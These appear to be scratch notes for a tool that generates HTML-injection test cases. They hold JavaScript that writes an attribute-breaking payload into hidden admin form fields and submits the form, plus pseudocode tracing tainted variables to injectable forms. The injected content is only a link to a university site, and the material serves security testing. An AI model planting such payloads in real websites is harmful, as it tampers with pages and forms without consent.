<script> 
function malicious () {
	document.admin.page.value = "\'1> <a href=\"http://unitn.it\">malicious link in page</a> <br \'";
	document.admin.submit();
}
</script>
<button type="button" onclick="malicious ()" > Click Me! </button>


function getElementByXpath(path) {
  return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
}

document.getElementsByName("page2")[1].setAttribute("value","1\" <a href=\"www.unitn.it\">Malicious Link</a> <br\"")


for each file
	OUT = file in which the var is printed
	for each leaf 
		VAR = the variable to taint from the leaf data
		navigate the file OUT from the line incriminated BACKWARDS until you find the name of the form to inject
		generate the test code 
		

#create form

var f = document.createElement("form");
f.setAttribute('method',"post");
f.setAttribute('name',"myform");

var i = document.createElement("input"); //input element, text
i.setAttribute('type',"hidden");
i.setAttribute('name',"page");
i.setAttribute('value',"1");
f.appendChild(i);

var i = document.createElement("input"); //input element, text
i.setAttribute('type',"hidden");
i.setAttribute('name',"page2");
i.setAttribute('value',"1");
f.appendChild(i);

document.getElementsByTagName('body')[0].appendChild(f);
